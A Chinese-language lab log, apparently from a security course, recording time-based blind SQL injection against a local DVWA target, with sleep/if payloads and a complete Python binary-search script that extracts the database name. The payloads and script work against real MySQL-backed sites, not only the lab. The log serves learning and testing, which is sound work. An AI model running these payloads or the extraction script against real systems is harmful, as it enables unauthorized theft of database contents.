## 二、实操过程记录

### 阶段 1：验证时间盲注（15 分钟）

先确认 sleep() 真的能让页面变慢。这一步是后面所有判断的地基，地基不牢，后面全是误判。

```sql
# 基线：正常请求
1
# 注入：无条件延迟 3 秒
1' and sleep(3)--
```
正常请求响应时间：约 0.05 秒。

注入 sleep(3) 响应时间：约 3.1 秒。

> 结论：延迟稳定、可观测，时间盲注通道成立。

注意：-- 后面必须带空格，URL 里写成 --+ 或 --%20。

### 阶段 2：条件时间盲注（25 分钟）

无条件的 sleep 只能证明「能延迟」，不能带信息。把 sleep 包进 if()，让延迟只在条件为真时发生，就变成了一道是非题。

```sql
# 条件为真 → 延迟 3 秒
1' and if(1=1, sleep(3), 0)--
# 条件为假 → 立即返回
1' and if(1=2, sleep(3), 0)--
```
1=1 时响应时间：约 3.1 秒。

1=2 时响应时间：约 0.06 秒。

判据：延迟 > 2 秒视为「真」，< 1 秒视为「假」；两者差距足够大，网络抖动手动排除。

### 阶段 3：判断数据库名长度（30 分钟）

把条件换成 length(database())=N，逐个试。命中时页面卡 3 秒。

```sql
1' and if(length(database())=1, sleep(3), 0)--
1' and if(length(database())=2, sleep(3), 0)--
1' and if(length(database())=3, sleep(3), 0)--
1' and if(length(database())=4, sleep(3), 0)--
```
数据库名长度：4

验证 payload：1' and if(length(database())=4, sleep(3), 0)--

优化：直接二分 length(database())>2，两次就能定位。

### 阶段 4：Python 自动化脚本（60 分钟）

时间盲注每次请求都要等 3 秒，手工猜一个表名要半小时以上。必须脚本化，并且把 sleep 时间压到 2 秒、阈值设成 1.5 秒。

```python
import requests, time
URL = "http://192.168.1.101/dvwa/vulnerabilities/sqli_blind/"
COOKIE = {"PHPSESSID": "你的会话ID", "security": "low"}
SLEEP = 2
THRESHOLD = 1.5
s = requests.Session()
s.trust_env = False          # 避免走系统代理
def is_true(payload):
start = time.time()
s.get(URL, params={"id": payload, "Submit": "Submit"},
cookies=COOKIE, timeout=15)
return time.time() - start > THRESHOLD
def get_length(expr):
lo, hi = 1, 64
while lo < hi:
mid = (lo + hi) // 2
p = f"1' and if(length({expr})>{mid}, sleep({SLEEP}), 0)-- "
if is_true(p):
lo = mid + 1
else:
hi = mid
return lo
def get_str(expr):
out = ""
for i in range(1, get_length(expr) + 1):
lo, hi = 32, 126
while lo < hi:
mid = (lo + hi) // 2
p = (f"1' and if(ascii(substr({expr},{i},1))>{mid}, "
f"sleep({SLEEP}), 0)-- ")
if is_true(p):
lo = mid + 1
else:
hi = mid
out += chr(lo)
print("  ->", out)
return out
if __name__ == "__main__":
print("database =", get_str("database()"))
```
运行结果：database = dvwa，耗时约 1 分 40 秒（约 50 次请求 × 2 秒）。

关键点一：s.trust_env = False，否则 Kali 上的 http_proxy 会把请求转到代理上，直接超时。

关键点二：阈值必须比 sleep 小、比网络抖动大，2 秒 sleep 配 1.5 秒阈值比较稳。

关键点三：会话 Cookie 必须带 security=low，否则页面走的是别的级别。

### 阶段 5：避坑记录

| 坑点 | 症状 | 解决办法 |
| --- | --- | --- |
| 延迟判断不准 | 偶发超时误判为真 | 阈值留余量，重试一次取多数 |
| sleep 不生效 | 始终秒回 | 检查 -- 后空格；检查是否被 disable_functions 禁 |
| 脚本全超时 | 报 ProxyError | session.trust_env=False 或设 no_proxy |
| 太慢 | 一个表名跑半小时 | sleep 降到 2 秒 + 二分法 + 并发（谨慎） |

Q：时间盲注和布尔盲注什么关系？A：同一个二分法，判据从页面文字换成响应时间。

Q：为什么真实环境很少用时间盲注？A：太慢，且对网络稳定性要求高。

## 三、实践心得

1. 时间盲注最反直觉的一点：它不依赖任何页面内容，只要服务器「能变慢」就够了。信道从「看到什么」变成了「等了多久」。

2. 自动化之后我才意识到，盲注的瓶颈不在 SQL，而在请求次数 × 单次耗时。所以优化的方向永远是「减少请求次数」和「压缩单次时间」。

3. 把判据抽象出来这件事很有价值：同一套二分框架，换个 is_true() 就是一个新工具。

## 四、重点与难点

1. 必须记住的知识点

① 时间盲注三件套：sleep() 制造延迟、if() 控制条件、二分法减少次数。

② 判据要有余量：sleep 2 秒、阈值 1.5 秒，比 3 秒更实用（快且够稳）。

③ 请求必须带正确的 Cookie（PHPSESSID + security），否则测的是别的级别。

④ 脚本里要禁掉环境代理，否则本地靶场请求会被代理吃掉。

2. 踩过的坑

① 第一次写 `--` 后面没空格，注释不生效，页面直接报错，误以为是 sleep 被禁。

② 脚本一直 ProxyError，查了半天发现 Kali 的 http_proxy 指向宿主机 Clash。

③ 阈值设成 1 秒，网络抖动时误判，改成 1.5 秒并重试一次后才稳定。

3. 需要补的课

① 补课：MySQL 的 benchmark() 作为 sleep 的替代延迟手段。

② 补课：怎么在真实环境里用时间盲注判断「有没有 WAF 拦截」。

③ 预习：Day 033 报错注入，用错误信息直接把数据带出来。

## 六、今日总结

今天把判据从「页面文字」换成了「响应时间」。同一个二分法，换了个信道，在完全无回显的环境里也能把 dvwa 猜出来。

手写脚本跑通那一刻最有成就感：50 次请求，1 分 40 秒，自动吐出 database = dvwa。这就是「把体力活交给代码」。

时间盲注慢，但它是最可靠的兜底——只要数据库还能执行 sleep，就能把数据带出来。
